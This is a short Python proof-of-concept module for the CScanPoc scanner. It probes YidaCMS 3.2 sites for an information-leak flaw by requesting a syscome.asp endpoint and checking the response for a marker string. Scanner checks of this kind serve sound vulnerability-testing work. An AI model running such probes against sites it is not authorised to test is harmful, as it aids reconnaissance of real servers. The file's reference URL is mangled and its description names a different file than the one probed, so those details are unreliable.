# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'YidaCMS_0001'  # 平台漏洞编号，留空
    name = 'Yidacms v3.2 /Yidacms/user/user.asp 信息泄漏'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-11-25'  # 漏洞公布时间
    desc = '''
        YidaCMS免费开源网站管理系统，是一款简单、实用、高效的网站建站软件。YidaCMS免费开源网站管理系统是基于微软的WINDOWS IIS平台，采用ASP语言ACCESS和MSSQL双数据库开发完成。\n整体系统采用强大的HTML引擎，模板设计和程序语言完全分开，这会让您在设计模板时更加快捷和方便。全站静态化及标准的URL路径，更加让百度等搜索引擎青睐。
        漏洞文件：/Yidacms/admin/admin_syscome.asp
    '''  # 漏洞描述
    ref = 'tps://bugs.shuimugan.com/bug/view?bug_no=074065'  # 漏洞来源ht
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YidaCMS(易达CMS)'  # 漏洞应用名称
    product_version = '3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6c34beed-34a5-4716-bdb1-1ce8d7ae921a'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/yidawap/syscome.asp?stype=safe_info'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '服务器相对不安全的组件检测' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
